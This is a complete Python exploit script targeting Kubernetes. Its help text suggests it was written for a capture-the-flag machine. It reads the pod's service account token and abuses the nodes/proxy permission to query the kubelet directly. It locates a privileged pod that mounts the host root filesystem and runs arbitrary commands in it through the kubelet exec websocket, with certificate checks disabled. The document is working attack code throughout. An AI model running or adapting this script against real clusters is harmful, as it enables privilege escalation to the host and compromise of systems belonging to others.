#!/usr/bin/env python3
import asyncio
import ssl
import sys
import os
import json
import argparse
import urllib.request
import websockets

TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()

# Cluster API server address is dynamic per-instance, but Kubernetes
# injects it into every pod's environment automatically, so it does
# not need to be hardcoded or supplied manually.
API_SERVER = f"https://{os.environ.get('KUBERNETES_SERVICE_HOST', '10.43.0.1')}:" \
             f"{os.environ.get('KUBERNETES_SERVICE_PORT', '443')}"


def get_ssl_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def find_privileged_pod(node_ip):
    """
    Queries the kubelet's own /pods endpoint directly on the target node
    (not the cluster API server, since the service account token only has
    'get' on nodes/proxy, not list/get on the core pods resource).
    Returns (node_ip, namespace, pod_name, container_name) for the first
    pod found that is privileged and mounts the host root filesystem.
    """
    url = f"https://{node_ip}:10250/pods"

    req = urllib.request.Request(url)
    req.add_header("Authorization", f"Bearer {TOKEN}")

    try:
        with urllib.request.urlopen(req, context=get_ssl_context(), timeout=10) as response:
            data = json.loads(response.read().decode())
    except Exception as e:
        print(f"[-] Failed to list pods via kubelet: {e}", file=sys.stderr)
        sys.exit(1)

    for item in data.get('items', []):
        metadata = item.get('metadata', {})
        spec = item.get('spec', {})

        ns = metadata.get('namespace')
        name = metadata.get('name')

        vols = spec.get('volumes', [])
        has_root_hostpath = any(v.get('hostPath', {}).get('path') == '/' for v in vols)

        if not has_root_hostpath:
            continue

        for c in spec.get('containers', []):
            sc = c.get('securityContext', {})
            if sc.get('privileged'):
                print(f"[+] Found target: {ns}/{name} (container: {c['name']}) on {node_ip}",
                      file=sys.stderr)
                return node_ip, ns, name, c['name']

    print("[-] No suitable privileged pod with hostPath '/' found.", file=sys.stderr)
    sys.exit(1)


async def ws_exec(node_ip, namespace, pod_name, container_name, cmd_parts):
    """
    Opens a websocket connection to the kubelet's exec endpoint for the
    given pod/container and streams command output back to stdout.
    """
    ctx = get_ssl_context()
    args = "&".join(f"command={part}" for part in cmd_parts)

    url = (
        f"wss://{node_ip}:10250/exec/{namespace}/{pod_name}/{container_name}"
        f"?output=1&error=1&{args}"
    )
    try:
        async with websockets.connect(
            url,
            ssl=ctx,
            additional_headers={"Authorization": f"Bearer {TOKEN}"},
            subprotocols=["v4.channel.k8s.io"],
            open_timeout=10
        ) as ws:
            try:
                while True:
                    data = await asyncio.wait_for(ws.recv(), timeout=5)
                    if isinstance(data, bytes) and len(data) > 1:
                        # First byte is a channel prefix (stdout/stderr), strip it.
                        sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                        sys.stdout.flush()
            except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
                pass
    except Exception as e:
        print(f"[-] Execution failed: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Discover a privileged pod via kubelet and exec a command on it "
                    "using the nodes/proxy permission."
    )
    parser.add_argument("node_ip", help="Target node IP (the box's main IP, e.g. 10.129.x.x)")
    parser.add_argument("command", nargs=argparse.REMAINDER,
                         help="Command to run, e.g. cat /host/root/root/root.txt")
    args = parser.parse_args()

    if not args.command:
        args.command = ["id"]

    node_ip, ns, pod, container = find_privileged_pod(args.node_ip)
    asyncio.run(ws_exec(node_ip, ns, pod, container, args.command))
